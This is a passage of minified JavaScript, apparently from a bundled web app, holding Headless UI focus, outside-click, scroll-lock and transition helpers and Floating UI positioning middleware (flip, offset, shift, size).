    var He = (e => (e[e.First = 1] = "First", e[e.Previous = 2] = "Previous", e[e.Next = 4] = "Next", e[e.Last = 8] = "Last", e[e.WrapAround = 16] = "WrapAround", e[e.NoScroll = 32] = "NoScroll", e[e.AutoFocus = 64] = "AutoFocus", e))(He || {}),
        Bi = (e => (e[e.Error = 0] = "Error", e[e.Overflow = 1] = "Overflow", e[e.Success = 2] = "Success", e[e.Underflow = 3] = "Underflow", e))(Bi || {}),
        oT = (e => (e[e.Previous = -1] = "Previous", e[e.Next = 1] = "Next", e))(oT || {});

    function Gb(e = document.body) {
        return e == null ? [] : Array.from(e.querySelectorAll(du)).sort((t, n) => Math.sign((t.tabIndex || Number.MAX_SAFE_INTEGER) - (n.tabIndex || Number.MAX_SAFE_INTEGER)))
    }

    function sT(e = document.body) {
        return e == null ? [] : Array.from(e.querySelectorAll(iT)).sort((t, n) => Math.sign((t.tabIndex || Number.MAX_SAFE_INTEGER) - (n.tabIndex || Number.MAX_SAFE_INTEGER)))
    }
    var i0 = (e => (e[e.Strict = 0] = "Strict", e[e.Loose = 1] = "Loose", e))(i0 || {});

    function o0(e, t = 0) {
        var n;
        return e === ((n = mi(e)) == null ? void 0 : n.body) ? !1 : Et(t, {
            0() {
                return e.matches(du)
            },
            1() {
                let r = e;
                for (; r !== null;) {
                    if (r.matches(du)) return !0;
                    r = r.parentElement
                }
                return !1
            }
        })
    }

    function Vb(e) {
        let t = mi(e);
        Yn().nextFrame(() => {
            t && !o0(t.activeElement, 0) && Gn(e)
        })
    }
    var aT = (e => (e[e.Keyboard = 0] = "Keyboard", e[e.Mouse = 1] = "Mouse", e))(aT || {});
    typeof window < "u" && typeof document < "u" && (document.addEventListener("keydown", e => {
        e.metaKey || e.altKey || e.ctrlKey || (document.documentElement.dataset.headlessuiFocusVisible = "")
    }, !0), document.addEventListener("click", e => {
        e.detail === 1 ? delete document.documentElement.dataset.headlessuiFocusVisible : e.detail === 0 && (document.documentElement.dataset.headlessuiFocusVisible = "")
    }, !0));

    function Gn(e) {
        e == null || e.focus({
            preventScroll: !0
        })
    }
    let lT = ["textarea", "input"].join(",");

    function cT(e) {
        var t, n;
        return (n = (t = e == null ? void 0 : e.matches) == null ? void 0 : t.call(e, lT)) != null ? n : !1
    }

    function Mi(e, t = n => n) {
        return e.slice().sort((n, r) => {
            let i = t(n),
                o = t(r);
            if (i === null || o === null) return 0;
            let s = i.compareDocumentPosition(o);
            return s & Node.DOCUMENT_POSITION_FOLLOWING ? -1 : s & Node.DOCUMENT_POSITION_PRECEDING ? 1 : 0
        })
    }

    function uT(e, t) {
        return ln(Gb(), t, {
            relativeTo: e
        })
    }

    function ln(e, t, {
        sorted: n = !0,
        relativeTo: r = null,
        skipElements: i = []
    } = {}) {
        let o = Array.isArray(e) ? e.length > 0 ? e[0].ownerDocument : document : e.ownerDocument,
            s = Array.isArray(e) ? n ? Mi(e) : e : t & 64 ? sT(e) : Gb(e);
        i.length > 0 && s.length > 1 && (s = s.filter(h => !i.some(v => v != null && "current" in v ? (v == null ? void 0 : v.current) === h : v === h))), r = r ?? o.activeElement;
        let a = (() => {
                if (t & 5) return 1;
                if (t & 10) return -1;
                throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
            })(),
            l = (() => {
                if (t & 1) return 0;
                if (t & 2) return Math.max(0, s.indexOf(r)) - 1;
                if (t & 4) return Math.max(0, s.indexOf(r)) + 1;
                if (t & 8) return s.length - 1;
                throw new Error("Missing Focus.First, Focus.Previous, Focus.Next or Focus.Last")
            })(),
            u = t & 32 ? {
                preventScroll: !0
            } : {},
            c = 0,
            d = s.length,
            f;
        do {
            if (c >= d || c + d <= 0) return 0;
            let h = l + c;
            if (t & 16) h = (h + d) % d;
            else {
                if (h < 0) return 3;
                if (h >= d) return 1
            }
            f = s[h], f == null || f.focus(u), c += a
        } while (f !== o.activeElement);
        return t & 6 && cT(f) && f.select(), 2
    }

    function Wb() {
        return /iPhone/gi.test(window.navigator.platform) || /Mac/gi.test(window.navigator.platform) && window.navigator.maxTouchPoints > 0
    }

    function dT() {
        return /Android/gi.test(window.navigator.userAgent)
    }

    function fT() {
        return Wb() || dT()
    }

    function ta(e, t, n, r) {
        let i = xn(n);
        b.useEffect(() => {
            if (!e) return;

            function o(s) {
                i.current(s)
            }
            return document.addEventListener(t, o, r), () => document.removeEventListener(t, o, r)
        }, [e, t, r])
    }

    function qb(e, t, n, r) {
        let i = xn(n);
        b.useEffect(() => {
            if (!e) return;

            function o(s) {
                i.current(s)
            }
            return window.addEventListener(t, o, r), () => window.removeEventListener(t, o, r)
        }, [e, t, r])
    }
    const Lv = 30;

    function Qb(e, t, n) {
        let r = Os(e, "outside-click"),
            i = xn(n),
            o = b.useCallback(function(l, u) {
                if (l.defaultPrevented) return;
                let c = u(l);
                if (c === null || !c.getRootNode().contains(c) || !c.isConnected) return;
                let d = function f(h) {
                    return typeof h == "function" ? f(h()) : Array.isArray(h) || h instanceof Set ? h : [h]
                }(t);
                for (let f of d)
                    if (f !== null && (f.contains(c) || l.composed && l.composedPath().includes(f))) return;
                return !o0(c, i0.Loose) && c.tabIndex !== -1 && l.preventDefault(), i.current(l, c)
            }, [i, t]),
            s = b.useRef(null);
        ta(r, "pointerdown", l => {
            var u, c;
            s.current = ((c = (u = l.composedPath) == null ? void 0 : u.call(l)) == null ? void 0 : c[0]) || l.target
        }, !0), ta(r, "mousedown", l => {
            var u, c;
            s.current = ((c = (u = l.composedPath) == null ? void 0 : u.call(l)) == null ? void 0 : c[0]) || l.target
        }, !0), ta(r, "click", l => {
            fT() || s.current && (o(l, () => s.current), s.current = null)
        }, !0);
        let a = b.useRef({
            x: 0,
            y: 0
        });
        ta(r, "touchstart", l => {
            a.current.x = l.touches[0].clientX, a.current.y = l.touches[0].clientY
        }, !0), ta(r, "touchend", l => {
            let u = {
                x: l.changedTouches[0].clientX,
                y: l.changedTouches[0].clientY
            };
            if (!(Math.abs(u.x - a.current.x) >= Lv || Math.abs(u.y - a.current.y) >= Lv)) return o(l, () => l.target instanceof HTMLElement ? l.target : null)
        }, !0), qb(r, "blur", l => o(l, () => window.document.activeElement instanceof HTMLIFrameElement ? window.document.activeElement : null), !0)
    }

    function Ls(...e) {
        return b.useMemo(() => mi(...e), [...e])
    }

    function Kb(e, t, n, r) {
        let i = xn(n);
        b.useEffect(() => {
            e = e ?? window;

            function o(s) {
                i.current(s)
            }
            return e.addEventListener(t, o, r), () => e.removeEventListener(t, o, r)
        }, [e, t, r])
    }

    function Zb(e, t) {
        return b.useMemo(() => {
            var n;
            if (e.type) return e.type;
            let r = (n = e.as) != null ? n : "button";
            if (typeof r == "string" && r.toLowerCase() === "button" || (t == null ? void 0 : t.tagName) === "BUTTON" && !t.hasAttribute("type")) return "button"
        }, [e.type, e.as, t])
    }

    function hT() {
        let e;
        return {
            before({
                doc: t
            }) {
                var n;
                let r = t.documentElement,
                    i = (n = t.defaultView) != null ? n : window;
                e = Math.max(0, i.innerWidth - r.clientWidth)
            },
            after({
                doc: t,
                d: n
            }) {
                let r = t.documentElement,
                    i = Math.max(0, r.clientWidth - r.offsetWidth),
                    o = Math.max(0, e - i);
                n.style(r, "paddingRight", `${o}px`)
            }
        }
    }

    function pT() {
        return Wb() ? {
            before({
                doc: e,
                d: t,
                meta: n
            }) {
                function r(i) {
                    return n.containers.flatMap(o => o()).some(o => o.contains(i))
                }
                t.microTask(() => {
                    var i;
                    if (window.getComputedStyle(e.documentElement).scrollBehavior !== "auto") {
                        let a = Yn();
                        a.style(e.documentElement, "scrollBehavior", "auto"), t.add(() => t.microTask(() => a.dispose()))
                    }
                    let o = (i = window.scrollY) != null ? i : window.pageYOffset,
                        s = null;
                    t.addEventListener(e, "click", a => {
                        if (a.target instanceof HTMLElement) try {
                            let l = a.target.closest("a");
                            if (!l) return;
                            let {
                                hash: u
                            } = new URL(l.href), c = e.querySelector(u);
                            c && !r(c) && (s = c)
                        } catch {}
                    }, !0), t.addEventListener(e, "touchstart", a => {
                        if (a.target instanceof HTMLElement)
                            if (r(a.target)) {
                                let l = a.target;
                                for (; l.parentElement && r(l.parentElement);) l = l.parentElement;
                                t.style(l, "overscrollBehavior", "contain")
                            } else t.style(a.target, "touchAction", "none")
                    }), t.addEventListener(e, "touchmove", a => {
                        if (a.target instanceof HTMLElement) {
                            if (a.target.tagName === "INPUT") return;
                            if (r(a.target)) {
                                let l = a.target;
                                for (; l.parentElement && l.dataset.headlessuiPortal !== "" && !(l.scrollHeight > l.clientHeight || l.scrollWidth > l.clientWidth);) l = l.parentElement;
                                l.dataset.headlessuiPortal === "" && a.preventDefault()
                            } else a.preventDefault()
                        }
                    }, {
                        passive: !1
                    }), t.add(() => {
                        var a;
                        let l = (a = window.scrollY) != null ? a : window.pageYOffset;
                        o !== l && window.scrollTo(0, o), s && s.isConnected && (s.scrollIntoView({
                            block: "nearest"
                        }), s = null)
                    })
                })
            }
        } : {}
    }

    function mT() {
        return {
            before({
                doc: e,
                d: t
            }) {
                t.style(e.documentElement, "overflow", "hidden")
            }
        }
    }

    function gT(e) {
        let t = {};
        for (let n of e) Object.assign(t, n(t));
        return t
    }
    let Oi = Hb(() => new Map, {
        PUSH(e, t) {
            var n;
            let r = (n = this.get(e)) != null ? n : {
                doc: e,
                count: 0,
                d: Yn(),
                meta: new Set
            };
            return r.count++, r.meta.add(t), this.set(e, r), this
        },
        POP(e, t) {
            let n = this.get(e);
            return n && (n.count--, n.meta.delete(t)), this
        },
        SCROLL_PREVENT({
            doc: e,
            d: t,
            meta: n
        }) {
            let r = {
                    doc: e,
                    d: t,
                    meta: gT(n)
                },
                i = [pT(), hT(), mT()];
            i.forEach(({
                before: o
            }) => o == null ? void 0 : o(r)), i.forEach(({
                after: o
            }) => o == null ? void 0 : o(r))
        },
        SCROLL_ALLOW({
            d: e
        }) {
            e.dispose()
        },
        TEARDOWN({
            doc: e
        }) {
            this.delete(e)
        }
    });
    Oi.subscribe(() => {
        let e = Oi.getSnapshot(),
            t = new Map;
        for (let [n] of e) t.set(n, n.documentElement.style.overflow);
        for (let n of e.values()) {
            let r = t.get(n.doc) === "hidden",
                i = n.count !== 0;
            (i && !r || !i && r) && Oi.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n), n.count === 0 && Oi.dispatch("TEARDOWN", n)
        }
    });

    function vT(e, t, n = () => ({
        containers: []
    })) {
        let r = $b(Oi),
            i = t ? r.get(t) : void 0,
            o = i ? i.count > 0 : !1;
        return ve(() => {
            if (!(!t || !e)) return Oi.dispatch("PUSH", t, n), () => Oi.dispatch("POP", t, n)
        }, [e, t]), o
    }

    function Yb(e, t, n = () => [document.body]) {
        let r = Os(e, "scroll-lock");
        vT(r, t, i => {
            var o;
            return {
                containers: [...(o = i.containers) != null ? o : [], n]
            }
        })
    }

    function Fv(e) {
        return [e.screenX, e.screenY]
    }

    function yT() {
        let e = b.useRef([-1, -1]);
        return {
            wasMoved(t) {
                let n = Fv(t);
                return e.current[0] === n[0] && e.current[1] === n[1] ? !1 : (e.current = n, !0)
            },
            update(t) {
                e.current = Fv(t)
            }
        }
    }

    function wT(e = 0) {
        let [t, n] = b.useState(e), r = b.useCallback(l => n(l), [t]), i = b.useCallback(l => n(u => u | l), [t]), o = b.useCallback(l => (t & l) === l, [t]), s = b.useCallback(l => n(u => u & ~l), [n]), a = b.useCallback(l => n(u => u ^ l), [n]);
        return {
            flags: t,
            setFlag: r,
            addFlag: i,
            hasFlag: o,
            removeFlag: s,
            toggleFlag: a
        }
    }
    var bT = {},
        Dv, jv;
    typeof process < "u" && typeof globalThis < "u" && typeof Element < "u" && ((Dv = process == null ? void 0 : bT) == null ? void 0 : Dv.NODE_ENV) === "test" && typeof((jv = Element == null ? void 0 : Element.prototype) == null ? void 0 : jv.getAnimations) > "u" && (Element.prototype.getAnimations = function() {
        return console.warn(["Headless UI has polyfilled `Element.prototype.getAnimations` for your tests.", "Please install a proper polyfill e.g. `jsdom-testing-mocks`, to silence these warnings.", "", "Example usage:", "```js", "import { mockAnimationsApi } from 'jsdom-testing-mocks'", "mockAnimationsApi()", "```"].join(`
`)), []
    });
    var xT = (e => (e[e.None = 0] = "None", e[e.Closed = 1] = "Closed", e[e.Enter = 2] = "Enter", e[e.Leave = 4] = "Leave", e))(xT || {});

    function Jb(e) {
        let t = {};
        for (let n in e) e[n] === !0 && (t[`data-${n}`] = "");
        return t
    }

    function Xb(e, t, n, r) {
        let [i, o] = b.useState(n), {
            hasFlag: s,
            addFlag: a,
            removeFlag: l
        } = wT(e && i ? 3 : 0), u = b.useRef(!1), c = b.useRef(!1), d = Ms();
        return ve(() => {
            var f;
            if (e) {
                if (n && o(!0), !t) {
                    n && a(3);
                    return
                }
                return (f = r == null ? void 0 : r.start) == null || f.call(r, n), ET(t, {
                    inFlight: u,
                    prepare() {
                        c.current ? c.current = !1 : c.current = u.current, u.current = !0, !c.current && (n ? (a(3), l(4)) : (a(4), l(2)))
                    },
                    run() {
                        c.current ? n ? (l(3), a(4)) : (l(4), a(3)) : n ? l(1) : a(1)
                    },
                    done() {
                        var h;
                        c.current && typeof t.getAnimations == "function" && t.getAnimations().length > 0 || (u.current = !1, l(7), n || o(!1), (h = r == null ? void 0 : r.end) == null || h.call(r, n))
                    }
                })
            }
        }, [e, n, t, d]), e ? [i, {
            closed: s(1),
            enter: s(2),
            leave: s(4),
            transition: s(2) || s(4)
        }] : [n, {
            closed: void 0,
            enter: void 0,
            leave: void 0,
            transition: void 0
        }]
    }

    function ET(e, {
        prepare: t,
        run: n,
        done: r,
        inFlight: i
    }) {
        let o = Yn();
        return _T(e, {
            prepare: t,
            inFlight: i
        }), o.nextFrame(() => {
            n(), o.requestAnimationFrame(() => {
                o.add(AT(e, r))
            })
        }), o.dispose
    }

    function AT(e, t) {
        var n, r;
        let i = Yn();
        if (!e) return i.dispose;
        let o = !1;
        i.add(() => {
            o = !0
        });
        let s = (r = (n = e.getAnimations) == null ? void 0 : n.call(e).filter(a => a instanceof CSSTransition)) != null ? r : [];
        return s.length === 0 ? (t(), i.dispose) : (Promise.allSettled(s.map(a => a.finished)).then(() => {
            o || t()
        }), i.dispose)
    }

    function _T(e, {
        inFlight: t,
        prepare: n
    }) {
        if (t != null && t.current) {
            n();
            return
        }
        let r = e.style.transition;
        e.style.transition = "none", n(), e.offsetHeight, e.style.transition = r
    }

    function ST(e, {
        container: t,
        accept: n,
        walk: r
    }) {
        let i = b.useRef(n),
            o = b.useRef(r);
        b.useEffect(() => {
            i.current = n, o.current = r
        }, [n, r]), ve(() => {
            if (!t || !e) return;
            let s = mi(t);
            if (!s) return;
            let a = i.current,
                l = o.current,
                u = Object.assign(d => a(d), {
                    acceptNode: a
                }),
                c = s.createTreeWalker(t, NodeFilter.SHOW_ELEMENT, u, !1);
            for (; c.nextNode();) l(c.currentNode)
        }, [t, e, i, o])
    }

    function s0(e, t) {
        let n = b.useRef([]),
            r = J(e);
        b.useEffect(() => {
            let i = [...n.current];
            for (let [o, s] of t.entries())
                if (n.current[o] !== s) {
                    let a = r(t, i);
                    return n.current = t, a
                }
        }, [r, ...t])
    }

    function Pd() {
        return typeof window < "u"
    }

    function Fs(e) {
        return ex(e) ? (e.nodeName || "").toLowerCase() : "#document"
    }

    function Wt(e) {
        var t;
        return (e == null || (t = e.ownerDocument) == null ? void 0 : t.defaultView) || window
    }

    function Jn(e) {
        var t;
        return (t = (ex(e) ? e.ownerDocument : e.document) || window.document) == null ? void 0 : t.documentElement
    }

    function ex(e) {
        return Pd() ? e instanceof Node || e instanceof Wt(e).Node : !1
    }

    function yt(e) {
        return Pd() ? e instanceof Element || e instanceof Wt(e).Element : !1
    }

    function qn(e) {
        return Pd() ? e instanceof HTMLElement || e instanceof Wt(e).HTMLElement : !1
    }

    function Hv(e) {
        return !Pd() || typeof ShadowRoot > "u" ? !1 : e instanceof ShadowRoot || e instanceof Wt(e).ShadowRoot
    }

    function Ll(e) {
        const {
            overflow: t,
            overflowX: n,
            overflowY: r,
            display: i
        } = In(e);
        return /auto|scroll|overlay|hidden|clip/.test(t + r + n) && !["inline", "contents"].includes(i)
    }

    function kT(e) {
        return ["table", "td", "th"].includes(Fs(e))
    }

    function Rd(e) {
        return [":popover-open", ":modal"].some(t => {
            try {
                return e.matches(t)
            } catch {
                return !1
            }
        })
    }

    function a0(e) {
        const t = l0(),
            n = yt(e) ? In(e) : e;
        return n.transform !== "none" || n.perspective !== "none" || (n.containerType ? n.containerType !== "normal" : !1) || !t && (n.backdropFilter ? n.backdropFilter !== "none" : !1) || !t && (n.filter ? n.filter !== "none" : !1) || ["transform", "perspective", "filter"].some(r => (n.willChange || "").includes(r)) || ["paint", "layout", "strict", "content"].some(r => (n.contain || "").includes(r))
    }

    function TT(e) {
        let t = oi(e);
        for (; qn(t) && !ds(t);) {
            if (a0(t)) return t;
            if (Rd(t)) return null;
            t = oi(t)
        }
        return null
    }

    function l0() {
        return typeof CSS > "u" || !CSS.supports ? !1 : CSS.supports("-webkit-backdrop-filter", "none")
    }

    function ds(e) {
        return ["html", "body", "#document"].includes(Fs(e))
    }

    function In(e) {
        return Wt(e).getComputedStyle(e)
    }

    function Nd(e) {
        return yt(e) ? {
            scrollLeft: e.scrollLeft,
            scrollTop: e.scrollTop
        } : {
            scrollLeft: e.scrollX,
            scrollTop: e.scrollY
        }
    }

    function oi(e) {
        if (Fs(e) === "html") return e;
        const t = e.assignedSlot || e.parentNode || Hv(e) && e.host || Jn(e);
        return Hv(t) ? t.host : t
    }

    function tx(e) {
        const t = oi(e);
        return ds(t) ? e.ownerDocument ? e.ownerDocument.body : e.body : qn(t) && Ll(t) ? t : tx(t)
    }

    function Xa(e, t, n) {
        var r;
        t === void 0 && (t = []), n === void 0 && (n = !0);
        const i = tx(e),
            o = i === ((r = e.ownerDocument) == null ? void 0 : r.body),
            s = Wt(i);
        if (o) {
            const a = mp(s);
            return t.concat(s, s.visualViewport || [], Ll(i) ? i : [], a && n ? Xa(a) : [])
        }
        return t.concat(i, Xa(i, [], n))
    }

    function mp(e) {
        return e.parent && Object.getPrototypeOf(e.parent) ? e.frameElement : null
    }

    function IT() {
        const e = navigator.userAgentData;
        return e && Array.isArray(e.brands) ? e.brands.map(t => {
            let {
                brand: n,
                version: r
            } = t;
            return n + "/" + r
        }).join(" ") : navigator.userAgent
    }
    const no = Math.min,
        dt = Math.max,
        el = Math.round,
        hc = Math.floor,
        Vn = e => ({
            x: e,
            y: e
        }),
        CT = {
            left: "right",
            right: "left",
            bottom: "top",
            top: "bottom"
        },
        PT = {
            start: "end",
            end: "start"
        };

    function $v(e, t, n) {
        return dt(e, no(t, n))
    }

    function Ds(e, t) {
        return typeof e == "function" ? e(t) : e
    }

    function si(e) {
        return e.split("-")[0]
    }

    function Fl(e) {
        return e.split("-")[1]
    }

    function nx(e) {
        return e === "x" ? "y" : "x"
    }

    function rx(e) {
        return e === "y" ? "height" : "width"
    }

    function ro(e) {
        return ["top", "bottom"].includes(si(e)) ? "y" : "x"
    }

    function ix(e) {
        return nx(ro(e))
    }

    function RT(e, t, n) {
        n === void 0 && (n = !1);
        const r = Fl(e),
            i = ix(e),
            o = rx(i);
        let s = i === "x" ? r === (n ? "end" : "start") ? "right" : "left" : r === "start" ? "bottom" : "top";
        return t.reference[o] > t.floating[o] && (s = fu(s)), [s, fu(s)]
    }

    function NT(e) {
        const t = fu(e);
        return [gp(e), t, gp(t)]
    }

    function gp(e) {
        return e.replace(/start|end/g, t => PT[t])
    }

    function BT(e, t, n) {
        const r = ["left", "right"],
            i = ["right", "left"],
            o = ["top", "bottom"],
            s = ["bottom", "top"];
        switch (e) {
            case "top":
            case "bottom":
                return n ? t ? i : r : t ? r : i;
            case "left":
            case "right":
                return t ? o : s;
            default:
                return []
        }
    }

    function MT(e, t, n, r) {
        const i = Fl(e);
        let o = BT(si(e), n === "start", r);
        return i && (o = o.map(s => s + "-" + i), t && (o = o.concat(o.map(gp)))), o
    }

    function fu(e) {
        return e.replace(/left|right|bottom|top/g, t => CT[t])
    }

    function OT(e) {
        return {
            top: 0,
            right: 0,
            bottom: 0,
            left: 0,
            ...e
        }
    }

    function LT(e) {
        return typeof e != "number" ? OT(e) : {
            top: e,
            right: e,
            bottom: e,
            left: e
        }
    }

    function hu(e) {
        const {
            x: t,
            y: n,
            width: r,
            height: i
        } = e;
        return {
            width: r,
            height: i,
            top: n,
            left: t,
            right: t + r,
            bottom: n + i,
            x: t,
            y: n
        }
    }

    function Uv(e, t, n) {
        let {
            reference: r,
            floating: i
        } = e;
        const o = ro(t),
            s = ix(t),
            a = rx(s),
            l = si(t),
            u = o === "y",
            c = r.x + r.width / 2 - i.width / 2,
            d = r.y + r.height / 2 - i.height / 2,
            f = r[a] / 2 - i[a] / 2;
        let h;
        switch (l) {
            case "top":
                h = {
                    x: c,
                    y: r.y - i.height
                };
                break;
            case "bottom":
                h = {
                    x: c,
                    y: r.y + r.height
                };
                break;
            case "right":
                h = {
                    x: r.x + r.width,
                    y: d
                };
                break;
            case "left":
                h = {
                    x: r.x - i.width,
                    y: d
                };
                break;
            default:
                h = {
                    x: r.x,
                    y: r.y
                }
        }
        switch (Fl(t)) {
            case "start":
                h[s] -= f * (n && u ? -1 : 1);
                break;
            case "end":
                h[s] += f * (n && u ? -1 : 1);
                break
        }
        return h
    }
    const FT = async (e, t, n) => {
        const {
            placement: r = "bottom",
            strategy: i = "absolute",
            middleware: o = [],
            platform: s
        } = n, a = o.filter(Boolean), l = await (s.isRTL == null ? void 0 : s.isRTL(t));
        let u = await s.getElementRects({
                reference: e,
                floating: t,
                strategy: i
            }),
            {
                x: c,
                y: d
            } = Uv(u, r, l),
            f = r,
            h = {},
            v = 0;
        for (let p = 0; p < a.length; p++) {
            const {
                name: w,
                fn: m
            } = a[p], {
                x: g,
                y,
                data: x,
                reset: E
            } = await m({
                x: c,
                y: d,
                initialPlacement: r,
                placement: f,
                strategy: i,
                middlewareData: h,
                rects: u,
                platform: s,
                elements: {
                    reference: e,
                    floating: t
                }
            });
            c = g ?? c, d = y ?? d, h = { ...h,
                [w]: { ...h[w],
                    ...x
                }
            }, E && v <= 50 && (v++, typeof E == "object" && (E.placement && (f = E.placement), E.rects && (u = E.rects === !0 ? await s.getElementRects({
                reference: e,
                floating: t,
                strategy: i
            }) : E.rects), {
                x: c,
                y: d
            } = Uv(u, f, l)), p = -1)
        }
        return {
            x: c,
            y: d,
            placement: f,
            strategy: i,
            middlewareData: h
        }
    };
    async function Bd(e, t) {
        var n;
        t === void 0 && (t = {});
        const {
            x: r,
            y: i,
            platform: o,
            rects: s,
            elements: a,
            strategy: l
        } = e, {
            boundary: u = "clippingAncestors",
            rootBoundary: c = "viewport",
            elementContext: d = "floating",
            altBoundary: f = !1,
            padding: h = 0
        } = Ds(t, e), v = LT(h), w = a[f ? d === "floating" ? "reference" : "floating" : d], m = hu(await o.getClippingRect({
            element: (n = await (o.isElement == null ? void 0 : o.isElement(w))) == null || n ? w : w.contextElement || await (o.getDocumentElement == null ? void 0 : o.getDocumentElement(a.floating)),
            boundary: u,
            rootBoundary: c,
            strategy: l
        })), g = d === "floating" ? {
            x: r,
            y: i,
            width: s.floating.width,
            height: s.floating.height
        } : s.reference, y = await (o.getOffsetParent == null ? void 0 : o.getOffsetParent(a.floating)), x = await (o.isElement == null ? void 0 : o.isElement(y)) ? await (o.getScale == null ? void 0 : o.getScale(y)) || {
            x: 1,
            y: 1
        } : {
            x: 1,
            y: 1
        }, E = hu(o.convertOffsetParentRelativeRectToViewportRelativeRect ? await o.convertOffsetParentRelativeRectToViewportRelativeRect({
            elements: a,
            rect: g,
            offsetParent: y,
            strategy: l
        }) : g);
        return {
            top: (m.top - E.top + v.top) / x.y,
            bottom: (E.bottom - m.bottom + v.bottom) / x.y,
            left: (m.left - E.left + v.left) / x.x,
            right: (E.right - m.right + v.right) / x.x
        }
    }
    const DT = function(e) {
        return e === void 0 && (e = {}), {
            name: "flip",
            options: e,
            async fn(t) {
                var n, r;
                const {
                    placement: i,
                    middlewareData: o,
                    rects: s,
                    initialPlacement: a,
                    platform: l,
                    elements: u
                } = t, {
                    mainAxis: c = !0,
                    crossAxis: d = !0,
                    fallbackPlacements: f,
                    fallbackStrategy: h = "bestFit",
                    fallbackAxisSideDirection: v = "none",
                    flipAlignment: p = !0,
                    ...w
                } = Ds(e, t);
                if ((n = o.arrow) != null && n.alignmentOffset) return {};
                const m = si(i),
                    g = ro(a),
                    y = si(a) === a,
                    x = await (l.isRTL == null ? void 0 : l.isRTL(u.floating)),
                    E = f || (y || !p ? [fu(a)] : NT(a)),
                    k = v !== "none";
                !f && k && E.push(...MT(a, p, v, x));
                const I = [a, ...E],
                    _ = await Bd(t, w),
                    L = [];
                let C = ((r = o.flip) == null ? void 0 : r.overflows) || [];
                if (c && L.push(_[m]), d) {
                    const Q = RT(i, s, x);
                    L.push(_[Q[0]], _[Q[1]])
                }
                if (C = [...C, {
                        placement: i,
                        overflows: L
                    }], !L.every(Q => Q <= 0)) {
                    var M, F;
                    const Q = (((M = o.flip) == null ? void 0 : M.index) || 0) + 1,
                        A = I[Q];
                    if (A) return {
                        data: {
                            index: Q,
                            overflows: C
                        },
                        reset: {
                            placement: A
                        }
                    };
                    let P = (F = C.filter(O => O.overflows[0] <= 0).sort((O, T) => O.overflows[1] - T.overflows[1])[0]) == null ? void 0 : F.placement;
                    if (!P) switch (h) {
                        case "bestFit":
                            {
                                var U;
                                const O = (U = C.filter(T => {
                                    if (k) {
                                        const B = ro(T.placement);
                                        return B === g || B === "y"
                                    }
                                    return !0
                                }).map(T => [T.placement, T.overflows.filter(B => B > 0).reduce((B, R) => B + R, 0)]).sort((T, B) => T[1] - B[1])[0]) == null ? void 0 : U[0];O && (P = O);
                                break
                            }
                        case "initialPlacement":
                            P = a;
                            break
                    }
                    if (i !== P) return {
                        reset: {
                            placement: P
                        }
                    }
                }
                return {}
            }
        }
    };
    async function jT(e, t) {
        const {
            placement: n,
            platform: r,
            elements: i
        } = e, o = await (r.isRTL == null ? void 0 : r.isRTL(i.floating)), s = si(n), a = Fl(n), l = ro(n) === "y", u = ["left", "top"].includes(s) ? -1 : 1, c = o && l ? -1 : 1, d = Ds(t, e);
        let {
            mainAxis: f,
            crossAxis: h,
            alignmentAxis: v
        } = typeof d == "number" ? {
            mainAxis: d,
            crossAxis: 0,
            alignmentAxis: null
        } : {
            mainAxis: d.mainAxis || 0,
            crossAxis: d.crossAxis || 0,
            alignmentAxis: d.alignmentAxis
        };
        return a && typeof v == "number" && (h = a === "end" ? v * -1 : v), l ? {
            x: h * c,
            y: f * u
        } : {
            x: f * u,
            y: h * c
        }
    }
    const HT = function(e) {
            return e === void 0 && (e = 0), {
                name: "offset",
                options: e,
                async fn(t) {
                    var n, r;
                    const {
                        x: i,
                        y: o,
                        placement: s,
                        middlewareData: a
                    } = t, l = await jT(t, e);
                    return s === ((n = a.offset) == null ? void 0 : n.placement) && (r = a.arrow) != null && r.alignmentOffset ? {} : {
                        x: i + l.x,
                        y: o + l.y,
                        data: { ...l,
                            placement: s
                        }
                    }
                }
            }
        },
        $T = function(e) {
            return e === void 0 && (e = {}), {
                name: "shift",
                options: e,
                async fn(t) {
                    const {
                        x: n,
                        y: r,
                        placement: i
                    } = t, {
                        mainAxis: o = !0,
                        crossAxis: s = !1,
                        limiter: a = {
                            fn: w => {
                                let {
                                    x: m,
                                    y: g
                                } = w;
                                return {
                                    x: m,
                                    y: g
                                }
                            }
                        },
                        ...l
                    } = Ds(e, t), u = {
                        x: n,
                        y: r
                    }, c = await Bd(t, l), d = ro(si(i)), f = nx(d);
                    let h = u[f],
                        v = u[d];
                    if (o) {
                        const w = f === "y" ? "top" : "left",
                            m = f === "y" ? "bottom" : "right",
                            g = h + c[w],
                            y = h - c[m];
                        h = $v(g, h, y)
                    }
                    if (s) {
                        const w = d === "y" ? "top" : "left",
                            m = d === "y" ? "bottom" : "right",
                            g = v + c[w],
                            y = v - c[m];
                        v = $v(g, v, y)
                    }
                    const p = a.fn({ ...t,
                        [f]: h,
                        [d]: v
                    });
                    return { ...p,
                        data: {
                            x: p.x - n,
                            y: p.y - r,
                            enabled: {
                                [f]: o,
                                [d]: s
                            }
                        }
                    }
                }
            }
        },
        UT = function(e) {
            return e === void 0 && (e = {}), {
                name: "size",
                options: e,
                async fn(t) {
                    var n, r;
                    const {
                        placement: i,
                        rects: o,
                        platform: s,
                        elements: a
                    } = t, {
                        apply: l = () => {},
                        ...u
                    } = Ds(e, t), c = await Bd(t, u), d = si(i), f = Fl(i), h = ro(i) === "y", {
                        width: v,
                        height: p
                    } = o.floating;
                    let w, m;
                    d === "top" || d === "bottom" ? (w = d, m = f === (await (s.isRTL == null ? void 0 : s.isRTL(a.floating)) ? "start" : "end") ? "left" : "right") : (m = d, w = f === "end" ? "top" : "bottom");
                    const g = p - c.top - c.bottom,
                        y = v - c.left - c.right,
                        x = no(p - c[w], g),
                        E = no(v - c[m], y),
                        k = !t.middlewareData.shift;
                    let I = x,
                        _ = E;
                    if ((n = t.middlewareData.shift) != null && n.enabled.x && (_ = y), (r = t.middlewareData.shift) != null && r.enabled.y && (I = g), k && !f) {
                        const C = dt(c.left, 0),
                            M = dt(c.right, 0),
                            F = dt(c.top, 0),
                            U = dt(c.bottom, 0);
                        h ? _ = v - 2 * (C !== 0 || M !== 0 ? C + M : dt(c.left, c.right)) : I = p - 2 * (F !== 0 || U !== 0 ? F + U : dt(c.top, c.bottom))
                    }
                    await l({ ...t,
                        availableWidth: _,
                        availableHeight: I
                    });
                    const L = await s.getDimensions(a.floating);
                    return v !== L.width || p !== L.height ? {
                        reset: {
                            rects: !0
                        }
